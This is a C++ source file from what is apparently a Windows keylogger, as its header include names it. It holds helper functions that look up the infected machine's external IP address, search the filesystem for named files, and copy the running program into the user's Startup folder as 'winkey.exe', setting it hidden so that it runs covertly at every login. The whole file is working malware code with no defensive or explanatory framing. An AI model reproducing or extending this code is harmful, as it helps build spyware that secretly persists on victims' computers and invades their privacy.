#include "Keylogger.h"

std::string getMyIp()
{
	HINTERNET net = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (net == NULL)
	{
		return "Unknown";
	}
	HINTERNET conn = InternetOpenUrl(net, L"http://myexternalip.com/raw", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (conn == NULL)
	{
		InternetCloseHandle(net);
		return "Unknown";
	}

	char buffer[4026];
	DWORD read;

	if (!InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read))
	{
		InternetCloseHandle(net);
		return "Unknown";
	}
	InternetCloseHandle(net);
	return std::string(buffer, read);
}

bool exist_file(std::string filename)
{
	struct stat buffer;
	return (stat(filename.c_str(), &buffer) == 0);
}

std::string searchFile(std::string base, std::string filename)
{
	for (const auto& entry : std::filesystem::recursive_directory_iterator(base))
	{
		if (entry.path().filename() == filename)
			return entry.path().string();
	}
	return ("NULL");
}

void createFileCopy()
{
	char keyloggerPath[MAX_PATH];
	GetModuleFileNameA(0, keyloggerPath, MAX_PATH);

	std::string destPath = winkey_g.localAppData + "\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winkey.exe";

	if (CopyFileA(keyloggerPath, destPath.c_str(), FALSE))
	{
		DWORD fileAttributes = GetFileAttributesA(destPath.c_str());
		if (fileAttributes != INVALID_FILE_ATTRIBUTES)
		{
			fileAttributes |= FILE_ATTRIBUTE_HIDDEN;
			SetFileAttributesA(destPath.c_str(), fileAttributes);
		}
	}
}